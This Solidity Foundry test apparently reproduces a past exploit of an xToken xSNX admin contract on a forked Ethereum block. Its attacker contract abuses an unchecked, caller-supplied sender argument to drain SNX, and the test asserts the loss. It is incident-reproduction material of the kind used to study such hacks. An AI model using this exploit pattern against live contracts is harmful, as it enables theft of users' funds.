// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IXSNXAdmin {
    struct AccountInfo {
        address owner;
        uint256 number;
    }

    function callFunction(
        address sender,
        AccountInfo calldata accountInfo,
        bytes calldata data
    ) external;
}

contract XTokenAttacker {
    IXSNXAdmin private constant XSNX_ADMIN = IXSNXAdmin(0x7Cd5E2d0056a7A7F09CBb86e540Ef4f6dCcc97dd);

    function attack(
        uint256 snxAmount
    ) external {
        IXSNXAdmin.AccountInfo memory accountInfo = IXSNXAdmin.AccountInfo({owner: address(this), number: 0});

        // sender is only a caller-controlled argument. The vulnerable function never checks msg.sender.
        XSNX_ADMIN.callFunction(address(XSNX_ADMIN), accountInfo, abi.encode(address(this), uint256(0), snxAmount));
    }
}

contract XTokenExploitTest is Test {
    IERC20 private constant SNX = IERC20(0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F);
    IERC20 private constant SUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private constant XSNX_ADMIN = 0x7Cd5E2d0056a7A7F09CBb86e540Ef4f6dCcc97dd;

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 13_118_319);
        XTokenAttacker attacker = new XTokenAttacker();

        uint256 snxBefore = SNX.balanceOf(XSNX_ADMIN);
        uint256 usdcBefore = USDC.balanceOf(XSNX_ADMIN);
        vm.prank(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
        SUSD.transfer(XSNX_ADMIN, 3_000_000 ether);
        attacker.attack(614_000 ether);

        assertLt(SNX.balanceOf(XSNX_ADMIN), snxBefore - 600_000 ether);
        assertGt(USDC.balanceOf(XSNX_ADMIN), usdcBefore);
    }
}
